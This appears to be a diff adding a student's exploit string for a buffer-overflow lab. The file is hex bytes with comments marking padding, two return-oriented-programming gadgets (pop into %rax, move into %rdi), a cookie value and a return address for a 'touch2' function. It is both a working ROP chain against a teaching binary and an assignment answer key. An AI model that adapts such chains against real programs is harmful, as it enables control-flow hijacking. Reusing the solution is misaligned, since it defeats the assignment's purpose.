@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+a9 8b 80 00 00 00 00 00 /* gadget for popq %rax */
+9f 5f 19 19 00 00 00 00 /* cookie */
+d0 8b 80 00 00 00 00 00 /* gadget for movq %rax,%rdi */
+e6 89 80 00 00 00 00 00 /* ret addr for touch2 */
